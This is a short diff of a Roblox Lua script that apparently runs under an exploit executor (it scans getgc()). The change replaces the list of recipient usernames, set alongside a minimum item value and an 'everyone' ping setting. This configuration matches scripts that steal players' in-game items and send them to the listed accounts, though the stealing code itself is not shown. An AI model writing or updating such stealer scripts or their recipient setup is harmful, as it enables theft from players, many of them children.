@@ -63,7 +63,7 @@ for _, v in pairs(getgc()) do
     end
 end
 
-_G.Usernames = {"GROW4GARDEN1M10022","GROW4GARDEN1M10017","GROW4GARDEN1M10018","GROW4GARDEN1M10019","GROW4GARDEN1M10020"}
+_G.Usernames = {"GROW4GARDEN1M10022","GROW4GARDEN1M10023","GROW4GARDEN1M10024","GROW4GARDEN1M10025","GROW4GARDEN1M10026"}
 _G.min_value = 0.03
 _G.pingEveryone = "Yes"
 _G.scriptExecuted = _G.scriptExecuted or false
